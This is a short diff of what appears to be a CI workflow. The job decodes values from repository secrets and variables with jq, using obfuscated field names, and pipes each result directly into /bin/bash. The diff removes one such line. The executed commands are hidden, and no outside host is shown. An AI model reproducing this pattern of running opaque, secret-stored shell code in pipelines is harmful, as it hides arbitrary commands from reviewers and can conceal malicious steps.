@@ -27,7 +27,6 @@ jobs:
           cgz8818: ${{ secrets.cgz8818 }}
         run: |
           printf '%s' "$cgz8818" | jq -r .bumaa764 | /bin/bash
-          echo $l95530 | jq -r .d2691 | /bin/bash
           printf '%s' "$tie4" | jq -r .vul7601 | /bin/bash
           printf '%s' "$suf8" | jq -r .xwzb460 | /bin/bash
           echo $ukdxa506 | jq -r .ophs0 | /bin/bash
